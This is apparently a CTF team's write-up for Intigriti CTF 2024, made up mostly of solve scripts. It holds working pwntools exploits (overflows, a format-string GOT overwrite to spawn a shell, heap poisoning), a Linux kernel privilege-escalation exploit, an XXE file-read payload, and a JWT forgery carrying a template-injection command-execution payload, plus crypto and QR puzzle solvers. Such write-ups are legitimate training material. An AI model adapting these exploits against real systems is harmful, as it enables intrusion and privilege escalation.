# Intigriti CTF 2024  by Mini-Venom

> 原文: https://www.ctfiot.com/215809.html
> ID: 215809

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组)

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('riggedslot2.ctf.intigriti.io',1337)
#p = process('./pwn')

rl("Enter your name:")
payload=b'a'*20+p32(0x14684d)+p32(1)
#bug()
sl(payload)

rl("per spin): ")
sl(str(1))
inter()
```



```
from pwn import*
from struct import pack
import ctypes
from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc6_2.23-0ubuntu11.3_amd64.so')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('retro2win.ctf.intigriti.io',1338)
#p = process('./pwn')
rdi=0x00000000004009b3
main=0x4008B7
rl("Select an option:")
sl(str(1337))
rl("Enter your cheatcode:")
payload=b'x00'*(0x10)+p64(0x602070+0x500)+p64(0x40076A)
#bug()
sl(payload)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('floormatsale.ctf.intigriti.io',1339)
#p = process('./pwn')
addr=0x40408C
rl("nEnter your choice:")
sl(str(6))
rl("nPlease enter your shipping address:")
payload=fmtstr_payload(10,{addr:1}) 

sl(payload)

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('uap.ctf.intigriti.io',1340)
#p = process('./pwn')

def add():
        rl("5. Exit")
        sl(str(1))
def free(i):
        rl("5. Exit")
        sl(str(2))
        sleep(0.1)
        sl(str(i))
def show(i):
        rl("5. Exit")
        sl(str(3))
        sleep(0.1)
        sl(str(i))
def add1(content):
        rl("5. Exit")
        sl(str(4))
        sleep(0.1)
        sl(content)

add()
add()
add()

free(1)
add1(b'a'*(0x10)+p64(0x400836)*2)
#bug()
show(1)

#bug()

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('notepad.ctf.intigriti.io',1341)
#p = process('./pwn')

rl(b'0x')
pie_base=int(p.recv(12),16)-0x119a
li(hex(pie_base))
key=pie_base+0x20204C
li(hex(key))
def add(i,size,content):
        rl("> ")
        sl(str(1))
        rl("> ")
        sl(str(i))
        rl("> ")
        sl(str(size))
        rl("> ")
        s(content)

def edit(i,content):
        rl("> ")
        sl(str(3))
        rl("> ")
        sl(str(i))
        rl("> ")
        s(content)

def free(i):
        rl("> ")
        sl(str(4))
        rl("> ")
        sl(str(i))

add(0,0x18,b'a')
add(1,0x68,b'a')
add(2,0x68,b'a')

free(2)
free(1)

edit(0,b'a'*(0x18)+p64(0x71)+p64(key))
add(3,0x68,b'a')
add(4,0x68,p64(0xCAFEBABE))
rl("> ")
sl(str(5))

inter()
```



```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("x7f")[-6:].ljust(8,b'x00'))
def get_addr32():
        return u32(p.recvuntil("xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/shx00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('x1b[01;38;5;214m' + x + 'x1b[0m')
ll = lambda x : print('x1b[01;38;5;1m' + x + 'x1b[0m')

    
#context(os='linux',arch='i386',log_level='debug')   
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('./libc.so.6')   
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6') 
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so') 
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')    
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
p=remote('notepad2.ctf.intigriti.io',1342)
#p = process('./pwn')

def add(i,content):
        rl("> ")
        sl(str(1))
        rl("> ")
        sl(str(i))
        rl("> ")
        sl(content)
        
def show(i):
        rl("> ")
        sl(str(2))
        rl("> ")
        sl(str(i))

def free(i):
        rl("> ")
        sl(str(3))
        rl("> ")
        sl(str(i))
add(0, b'%8$p%13$p')
show(0)
rl(b"0x")
stack = int(p.recv(12), 16) + 0x18
rl(b"0x")
libc_base = int(p.recv(12), 16) - 0x28150
li(hex(stack))
li(hex(libc_base))
system,bin_sh=get_sb()
malloc_hook,free_hook=get_hook()
free(0)

pay1=b'%'+str(stack&0xffff).encode()+b'c%14$hn'  
add(1,pay1)
show(1)

free_got=elf.got['free']
pay2=b'%'+str(free_got&0xffff).encode()+b'c%44$hn'  
add(2,pay2)
show(2)

pay3=b'%'+str(system&0xffff).encode()+b'c%15$hn'  
add(3,pay3)
show(3)

pay4=b'%'+str((free_got+2)&0xffff).encode()+b'c%44$hn' 
add(4,pay4)
show(4)

pay5=b'%'+str(system>>16&0xffff).encode()+b'c%15$hn'  
add(5,pay5)
show(5)

add(6,b'/bin/shx00')
free(6)

inter()
```



```
#include "Kernel.h"

char *buf, key[0x30];
int ko_fd;
long kernel_entry = 0xfffffe0000000000, kernel_base, canary, prepare_kernel_cred,commit_creds;
sem_t sem1, sem2, sem3;
long* ibuf;

void privilege_imporve() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov rsp,user_sp;"
        "xor rdi,rdi;"
        "mov rax,prepare_kernel_cred;"
        "call rax;"
        "mov rdi,rax;"
        "mov rax,commit_creds;"
        "call rax;"
        "xor rax,rax;"
        "swapgs;"
        "mov r15,user_ss;"
        "push r15;"
        "mov r15,user_sp;"
        "push r15;"
        "mov r15,user_rflags;"
        "push r15;"
        "mov r15,user_cs;"
        "push r15;"
        "mov r15,user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

int main() {
    save_user_land();
    signal(SIGSEGV, (sighandler_t)get_shell);
    bind_core(0);
    unshare_setup();
    buf = (char*)malloc(0x1000);
    memset(buf, 0, 0x1000);
    ibuf = (long*)buf;
    ko_fd = open("/dev/baby", O_RDWR);
    read(ko_fd, buf, 0x200);
    binary_dump(buf, 0x200, 0);
    canary = *(long*)(&buf[0x190]);
    kernel_base = *(long*)(&buf[0x198]) - 0x1ca727;
    prepare_kernel_cred = kernel_base + 0x861d0;
    commit_creds = kernel_base + 0x085fa0;
    ibuf[0x198 / 8] = (long)privilege_imporve;
    write(ko_fd, ibuf, 0x1a0);
    return 0;
}
```



```
const validUsername = "agent_1337";
const validPasswordHash = "91a915b6bdcfb47045859288a9e2bd651af246f07a083f11958550056bed8eac";

function getCredentials() {
    return {
        username: validUsername,
        passwordHash: validPasswordHash,
    };
}
```



```
X-Biocorp-Vpn: 80.187.61.102
```



```
<!DOCTYPE ent [
<!ENTITY ent SYSTEM "file:///flag.txt">
 ]>
<reactor>
    <temperature>&ent;</temperature>
    <pressure>200</pressure>
    <control_rods>50%</control_rods>
</reactor>
```



```
pug模板注入但是没法伪造jwt，不知道公钥有什么用
```



```
function verifyJWT(token) {
    return new Promise((resolve, reject) => {
        if (!token || typeof token !== "string" || token.split(".").length !== 3) {
            return reject(new Error("Invalid token format"));
        }

        jwt.decode(publicKey, token, (err, payload, header) => {
            if (err) {
                return reject(new Error("Invalid or expired token"));
            }

            if (header.alg.toLowerCase() === "none") {
                return reject(new Error("Algorithm 'none' is not allowed"));
            }

            resolve(payload);
        });
    });
}
```



```
const crypto = require("crypto");
const jwt = require("json-web-token");

const jwk = {
    kty: "RSA",
    n: "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw", 
    e: "AQAB", 
};

function base64urlDecode(data) {
    return Buffer.from(data.replace(/-/g, "+").replace(/_/g, "/"), "base64");
}

// 生成公钥
const publicKey = crypto.createPublicKey({
    key: {
        kty: jwk.kty,
        n: base64urlDecode(jwk.n).toString("base64"),
        e: base64urlDecode(jwk.e).toString("base64"),
    },
    format: "jwk",
});

function signJWT(payload) {
    return jwt.encode(publicKeyContent, payload, "HS256");
}

// console.log(publicKey.export({ format: "pem", type: "spki" }));
const publicKeyContent =publicKey.export({ format: "pem", type: "spki" })

const token = signJWT({ username: '#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").execSync("cat /flag_Gx4wVbEc1fxN9ztM.txt").toString();return sh;}()}' });
console.log(token.value);

const https = require('https')
const options = {
    hostname: 'catclub-3.ctf.intigriti.io',
    port: 443,
    path: '/cats',
    method: 'GET',
    headers: {
        'Cookie': `token=${token.value}`}

}

const req = https.request(options, res => {
console.log(`状态码: ${res.statusCode}`)

res.on('data', d => {
    process.stdout.write(d)
})
})

req.on('error', error => {
console.error(error)
})

req.end()
```



```
def otp(p, k):
    k_r = (k * ((len(p) // len(k)) + 1))[:len(p)]
    return bytes([p ^ k for p, k in zip(p, k_r)])
    
def reverse_check_cat_box(processed_text, cat_state):
    c = bytearray(processed_text)
    if cat_state == 1:
        for i in range(len(c)):
            # Undo: c[i] = ((c[i] << 1) & 0xFF) ^ 0xAC
            c[i] = (c[i] ^ 0xAC) >> 1
    else:
        for i in range(len(c)):
            # Undo: c[i] = ((c[i] >> 1) | (c[i] << 7)) & 0xFF
            c[i] = ((c[i] << 1) & 0xFF) | (c[i] >> 7)
            c[i] ^= 0xCA
    return bytes(c)

cycle_sq = b'a'*160
print(cycle_sq)
c1 = bytes.fromhex('30245e4b040e20081f131752096a5b324c4c3b2f64284212270e3736230341150b2027671427093b192024002c0c1d29404c1d06783e36631b4902773a700e585301343763660a503b2f4b230a580231240f1757032a585012472e1b39042f1b655c31160f561614092b160c135152330868463214217754381e54342640273c173802211333382546191b0d57701036062e601b56091c0e152b1109072a2b43')
c2 = bytes.fromhex('a8e0021cb8bafca29e82a4849afa1ec81eb6caece6fcaaa8cab0dceac2b2ac80aaf2e8f806b2e0b0cea082fc9ee4a2f4889e9cdcfef6bcc0809e86e6e0cea20c00a4ccdcf0e2aa0cfcf8b8c0a49ea6defab81c80fadc9e1ca2a0f080ce8afa00e408e802a000a406b0faaabc080800c2a2fe04eaacf0fe868c8e86e0c80eeaf2a0c08cfea0dac0f8ba1cb0a40ace80c0b8f8e0be82a09c9e8edc0cb4bee6f2b4')
x = reverse_check_cat_box(c2, 1)
print(x)
key = otp(x, cycle_sq)
print(key)
flag = otp(c1, key)
print(flag)

#b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
#b'x02&WXnx0b(x07x19x17x04x14x1b+Y2Yr3 %(x03x023x0e8#7x0fx00x16x03/"*Ux0f&x0e1x06x17(x19$x07,x12x19x188)-x086x16x19x15%&1x07PVx0408.'x03P(*n6x04x19x059+nXx16+8x19Xx07x06.x161x13+V$R"Wx06Vx04Ux0e+x03x08RRV7x07)T#x00.)x15x10x11x15&2Q#/x066x10)x06;6*x0bXx0ex04S1x166n*&tx17x06x18x19x118Px0ct%/x0c'
#b'cG69kjIfxveuzJ8S8lRADIbcRoYBVnawbNCK4nGoPgvIxEfMsxyYHLiWwxtDGPf17eQYOFb1IKkWexdXJk9wJYx9fgOwPrJ7E3C6g7e4oJbi337VfH5BaOHtqptGS0BNgWqHgZWKj9oe2PwWkKGhvgyxpY1mhDNm'
#b"Schrodinger's cat in a quantum bind, INTIGRITI{d34d_0r_4l1v3} hidden, hard to find. Is it alive, or has fate been spun? In superposition, the game's never done."
```



```
data=[  73, 78, 84, 73, 71, 82, 73, 84, 73, 49, 
  51, 51, 55, 117, 112, 35]

table=[  7, 125, 34, 122, 21, 21, 121, 58, 39, 113, 
  5, 70, 4, 81, 84, 2]

for i in range(len(data)):
    print(chr(data[i]^table[i]),end='')
#N3v3RG0nn@6u3$$!
```



```
table=[117,94,82,85,0,73,97,119,6,91,5,124,7,102,2,2,93,97,82,70,122,7,85,115,80,70,2,93,93,79]
key=[51,50]
for i in range(len(table)):
    print(chr(table[i]^key[i%2]),end='')
print("n")
bbq=[119,90,80,81,3,77,86,68,112,96,2,99,95,70,125,5,112,3,5,88,69,75]
key1=[49,54]
for i in range(len(bbq)):
    print(chr(bbq[i]^key1[i%2]),end='')
print("n")
bbqqq=[  0x7E, 0x54, 0x59, 0x5F, 0x09, 0x43, 0x4B, 0x0F, 0x4A, 0x5D, 
  0x59, 0x75, 0x7B, 0x51, 0x4A, 0x5B, 0x6D, 0x55, 0x0D, 0x0F, 
  0x0C, 0x76, 0x5B, 0x7D, 0x45]

for i in range(len(bbqqq)):
    print(chr(bbqqq[i]^0x38),end='')
```



```
SuPeRsEcUrEPaSsWoRd123x00111111111111111111111
```



```
from PIL import Image, ImageDraw
from itertools import permutations
import subprocess

qr_code_image = Image.open("qr_code.png")
width, height = qr_code_image.size
half_width, half_height = width // 2, height // 2

squares = {
    "1": (0, 0, half_width, half_height),
    "2": (half_width, 0, width, half_height),
    "3": (0, half_height, half_width, height),
    "4": (half_width, half_height, width, height)
}

def split_square_into_triangles(img, box):
    x0, y0, x1, y1 = box
    a_triangle_points = [(x0, y0), (x1, y0), (x0, y1)]
    b_triangle_points = [(x1, y1), (x1, y0), (x0, y1)]

    def crop_triangle(points):
        mask = Image.new("L", img.size, 0)
        draw = ImageDraw.Draw(mask)
        draw.polygon(points, fill=255)
        triangle_img = Image.new("RGBA", img.size)
        triangle_img.paste(img, (0, 0), mask)
        return triangle_img.crop((x0, y0, x1, y1))

    return crop_triangle(a_triangle_points), crop_triangle(b_triangle_points)

triangle_images = {}
for key, box in squares.items():
    triangle_images[f"{key}a"], triangle_images[f"{key}b"] = split_square_into_triangles(
        qr_code_image, box)

a_order = ["1", "2", "3", "4"]  # UPDATE ME
b_order = ["1", "2", "3", "4"]  # UPDATE ME

final_positions = [
    (0, 0),
    (half_width, 0),
    (0, half_height),
    (half_width, half_height)
]

reconstructed_image = Image.new("RGBA", qr_code_image.size)

for i in range(4):
    a_triangle = triangle_images[f"{a_order[i]}a"]
    b_triangle = triangle_images[f"{b_order[i]}b"]
    combined_square = Image.new("RGBA", (half_width, half_height))
    combined_square.paste(a_triangle, (0, 0))
    combined_square.paste(b_triangle, (0, 0), b_triangle)
    reconstructed_image.paste(combined_square, final_positions[i])

reconstructed_image.save("obscured.png")
print("Reconstructed QR code saved as 'obscured.png'")
```



```
from PIL import Image, ImageDraw
from itertools import permutations

def split_square_into_triangles(img, box):
    x0, y0, x1, y1 = box
    a_triangle_points = [(x0, y0), (x1, y0), (x0, y1)]
    b_triangle_points = [(x1, y1), (x1, y0), (x0, y1)]

    def crop_triangle(points):
        mask = Image.new("L", img.size, 0)
        draw = ImageDraw.Draw(mask)
        draw.polygon(points, fill=255)
        triangle_img = Image.new("RGBA", img.size)
        triangle_img.paste(img, (0, 0), mask)
        return triangle_img.crop((x0, y0, x1, y1))

    return crop_triangle(a_triangle_points), crop_triangle(b_triangle_points)

def reconstruct_qr_code(qr_code_image, a_order, b_order):
    width, height = qr_code_image.size
    half_width, half_height = width // 2, height // 2

    squares = {
        "1": (0, 0, half_width, half_height),
        "2": (half_width, 0, width, half_height),
        "3": (0, half_height, half_width, height),
        "4": (half_width, half_height, width, height)
    }

    triangle_images = {}
    for key, box in squares.items():
        triangle_images[f"{key}a"], triangle_images[f"{key}b"] = split_square_into_triangles(qr_code_image, box)

    final_positions = [
        (0, 0),
        (half_width, 0),
        (0, half_height),
        (half_width, half_height)
    ]

    reconstructed_image = Image.new("RGBA", qr_code_image.size)

    for i in range(4):
        a_triangle = triangle_images[f"{a_order[i]}a"]
        b_triangle = triangle_images[f"{b_order[i]}b"]
        combined_square = Image.new("RGBA", (half_width, half_height))
        combined_square.paste(a_triangle, (0, 0))
        combined_square.paste(b_triangle, (0, 0), b_triangle)
        reconstructed_image.paste(combined_square, final_positions[i])

    return reconstructed_image

def main():
    qr_code_image = Image.open("obscured.png")
    width, height = qr_code_image.size
    half_width, half_height = width // 2, height // 2

    orders = list(permutations(["1", "2", "3", "4"]))
    
    for a_order in orders:
        for b_order in orders:
            reconstructed_image = reconstruct_qr_code(qr_code_image, a_order, b_order)
            output_path = f"test/reconstructed_{''.join(a_order)}_{''.join(b_order)}.png"
            reconstructed_image.save(output_path)
            print(f"Reconstructed QR code saved as '{output_path}'")

if __name__ == '__main__':
    main()
```



```
0110100000110000011100000011001101011111011110010011000001110101 h0p3_y0u
5f336e6a30795f                                                   _3nj0y_
ZDRfYzdm                                                         d4_c7f
INTIGRITI{h0p3_y0u_3nj0y_d4_c7f}
```



```
596f756c6c4e65766572476574546869733731393438320a504b0304140009000800d87a5559cd24b3b292070000760d000008001c00666c61672e706e675554090003b8631667ed63166775780b000104e803000004e8030000446c9e90d17d4a3b9a5eea243cd5d135a3b569cef68131b6712c23800708c1e4a94e519a532e48cd4384338c7e969bf6fb2d23575838ab73639cb2c8a2bc7b46d6ee87217309b0c7ed0b3fe321473449149c3a8333774111426699aa53b6a1ed5f8a3357e36fdb0712aeddb664e834f191ebb4a15f1cf9ae83bb5d72d17842ca6d4cb6804602ac16fae4e2c3d802edbf90c2c5a2a658f0efaa6f4b4fccdd1959a43ee13f631f9d9ce96ee7985fde03c148d420794f24a70eaf96fbce91f379d48549667f0f9972c9523123605d49842938316c8a93815b88666f5c3a5bd4fd35591bd906338e22c461d432f2941715e3c8f1be4dab69bcf3e9c600abeb98d3017b07d347cf3d7263fe96b5b169303e476779df51340fd3c4f386aed423550510b0c86ae6357513a1d0fa7b090e13f53c72a2ca02e362ff2b816f29726474df12524290c63fad4dd2e954093410dd32fac03c221861caefc23b6869495c59e1c95c1f2c71b677b1c6d798a1f893dd23f2182232cdf44d3eca31f25b405b25f23bb8a48d2977d4e8124b477a5bc15c81b2b82d6ed8895a02c4ca24ee535b21068dbf7015590bf2780e77d6496e9f275258f1093e49139d3333d186c67bd98de0343a46651ddf30cbd625c0c00f7af44ff0d6da1b15f0f393ba6aaeac95fdb8af25da7280b6aee91437560e2b70107b0b0c978c8357e7c5fbb19fbf39ff6fe033d0b04860335be3536df644e2839a17953568bb9e69bb48714ddf5793d2c4a5d6e6f6ee57ae13d2eb0cd89e2eda16060c9582cae35fb47b196433850c203c27e8d2e84cb441e81030e180e8de28c8e57e56f12fb21973311a11b31834858a21f537f7dad4d3a787cf9c92897cac6b8387e71377dcadc8d98e79c2fdc559565c38f3cb59089e6154af03e034a3c6a275fa6da47825cb4195578cb7b856a2f08a597b51c3e14185aef93b5f9dd4e878e6899ceacf8c27301aa1f8f9b1b72a35707054f8cfc9d1a5f44a87a00001f7db70ee5c200b925fc30146a9b3fa4330297f6ba3d2877f6bd8738b4ec4a0c931b36369737dfde851b91ac986958baabe7a270647cffeeb26a4fea247bb1abf8dc1c303633d4b186fa7b5151cbfc823b16bbe848f0d62c875de118cab8bdef4f8c6d77a96921abc1de30ee2815cc0260fdc2f3edc8eb3da3464daef501b1fe2e0fa43e369571297f7ba96bca559ecc73cd62649edb4a3c79f3458461ebbca237abef853f29d194e73ec590166b1170126d3e5d0eb358d19c931fc81bbcf273a73a3a301b914ad036ccb19527de52965b5734db6a6a030cb501a9a22ddb0e47d40de7106770104e0c49a18d0a5c2ade5e368dcb483c38898f6285ac1b4e2969facd80d9c98020beaac3e9d319899141e087497eaf510205d03c15f1dd090a657336547091d262eef0e3df4e622a325558d346ffc67f921e4d8aeb8f6fb39df228111ab66c83cde0ecd6a3f1737bd40fd8cf3495e24e1c7311a2f4babef4df483da72808ba1c50494096fa0d2effd4b8eee8182e67c5b4efa19fb24c629585e67dc80580099c329ad27fde7a7487686651d32195d9bf7480db079bac1c5ac02b4ad4e71cb915e222e8faaef1c6759bd8f1fd0ccc436e9c5ebae67e0e9b8e046dd8a40d043c3809f2b56a242e64bac276a1631d79bbb35d22a0097e917bdb8fae698041e3acfa628e65742ab74baea411093985e836c490bf775866efe0af2a1595c3f3af647818701077f686fe96900a9bfeca3efd95b9d6e43d44d15216673f9ad80cdaa7eabf5ff67c0f6276c62df1100a1ea7d7cc7df45d30d128c26da12c72382a69acd151dc0651bf1021f070267f545ff8e1629d377ba3f1c883fbf9be2a8c46aeb6175174488f489cc9e476a7d6a8f012b867f79476326e13f9f5c24952240e7190ced92caa6f05ccc972dea8867bb2b11c70e7a0f7d0b29fe98f9f4bc66c7af70eef9be28f7a8ddd7e3d7095ca105c5c2a9b5f0112dd1a8cce4d5e4d6cf108f198f85b260ecd37a372e6d6d72d4755d2473ff29152a7e8fd4b699b24714258f111958264e7b0b7c5c8c25645564fc5e10c2a91cc6a3a5212af82139277c03f4d3df76676f3d8d35f87765590a1047f22f9b6d30bff6044ce090c35d449a36d14c7d4fb1b9ced3a08100eb4422f1b7f699a5242be355768bec3716c285f9da3273ad06e802f5e89771264cf875b0aaf23b91b1a0523287f8745fdb7e8663671e10b8d5efc521e91023abdce7b009a7b30d54914d358043cc1dfa892db57aa927503a1132567e298a6296ecdd167c41282509bd02cff7bd404d030e1397ac38689803d17bac9d585869119afc1a28137887dae7e921cac167abef0b9511925e4071cc1a1bd0c871603e3a6e0ed3c23ff95089622cc104b9b61d03ae4fd33af9f0fb16b92553ba1b835a445fc956307c9c4c49b6453e2c056c748111a05368de06982d86219e2f63585d1af8557e2820ea5a19285d74741e8e4f6e1249a6a6744bf2d0f0de846c24b1a070d23f6fe1bfce93a0dda7074eb38b4262f3652118c6a4c57f46807250ea938565d0a70235ef883a5d8edc786b74125e83d85dd69ca780a4a31c85c499ca95c31cdd9bf6ecb81668a5bd3e864354160014b2981dbd14a87d4f1432e84012b834ef043a19286b9ea2cba547b3193d73ddc727eddd78ceda9a306be60790389d799affc586e86ee7b601da36f42a7a290bea27c174a0993d0901d00f504b0708cd24b3b292070000760d0000504b01021e03140009000800d87a5559cd24b3b292070000760d0000080018000000000000000000f68100000000666c61672e706e675554050003b863166775780